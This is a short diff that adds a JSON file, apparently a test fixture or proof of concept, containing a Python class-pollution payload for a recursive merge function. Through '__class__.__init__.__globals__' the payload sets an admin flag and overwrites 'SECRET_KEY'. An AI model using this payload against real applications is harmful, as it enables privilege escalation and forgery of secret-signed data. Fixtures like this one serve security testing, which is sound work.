@@ -1,0 +1,13 @@
+{
+  "merge_fn": "recursive_merge",
+  "payload": {
+    "__class__": {
+      "admin": true,
+      "__init__": {
+        "__globals__": {
+          "SECRET_KEY": "pwned"
+        }
+      }
+    }
+  }
+}
